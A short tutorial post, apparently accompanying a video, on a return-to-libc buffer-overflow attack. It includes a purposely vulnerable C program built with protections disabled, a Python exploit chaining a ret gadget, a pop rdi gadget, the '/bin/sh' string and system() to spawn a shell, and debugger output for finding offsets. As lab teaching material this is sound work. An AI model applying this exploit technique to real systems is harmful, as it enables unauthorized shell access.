---
title: "Return to libc attack"
date: "2027-11-03"
tags:
  - "infosec"
  - "beginner"
  - "binexp"
  - "exploit"
---

watch the video on youtube

<yt-video id="2YPoSWGE-Fc"> </yt-video>

I'm sorry the vulnerable programe I show in the vide was wrong. you can find the correct code from below

`bof.c`

```c
#include<stdio.h>
#include<string.h>

void vuln_func();

int main(int argc, char *argv[])
{
        printf("hello\n");
        vuln_func();
}

void vuln_func()
{
        char buffer[256];
        gets(buffer);
}
```

`Makefile`

```Makefile
all:
        gcc -no-pie -fno-stack-protector bof.c -o vuln -D_FORIFY_SOURCE=0

clean:
        rm vuln
```

`exploit.py`

```python
#!/usr/bin/python

import struct


size = 256
libc_base = 0x00007ffff79e2000


padding = "A"* size
padding += "BBBBBBBB"


#padding += "CCCCC"

padding += struct.pack("Q", libc_base + 0x00000000000008aa) # added a ret to prevent stack issue
padding += struct.pack("Q", libc_base + 0x00000000000215bf) # the rip contain pop rpi ret
padding += struct.pack("Q", libc_base + 0x1b3e1a) # address for the bin sh
padding += struct.pack("Q", 0x7ffff7a31550) # addr for system


print padding
```

The Notes

---

## Finding the offset

found the offset to rbp

```

gef➤  pattern offset $rbp
[+] Searching for '$rbp'
[+] Found at offset 256 (little-endian search) likely
gef➤

```

overwting the rip

```python

#!/usr/bin/python

padding = "A" * 256
padding += "BBBBBBBB"
padding += "CCCCCC" # we writing the rip

print padding

```

- finding the addr for libc ( 0x00007ffff79e2000 )

- addr for ret ( 0x00000000000008aa )
- gadget (pop rdi , ret) ( 0x00000000000215bf )
- addr for the /bin/sh ( 1b3e1a )
- addr for system ( 0x7ffff7a31550 )

```
0x00000000000215bf: pop rdi; ret;
```

## found the bin sh

```

➜  yt strings -a -t x libc-2.27.so | grep '/bin/sh'
 1b3e1a /bin/sh
➜  yt

```
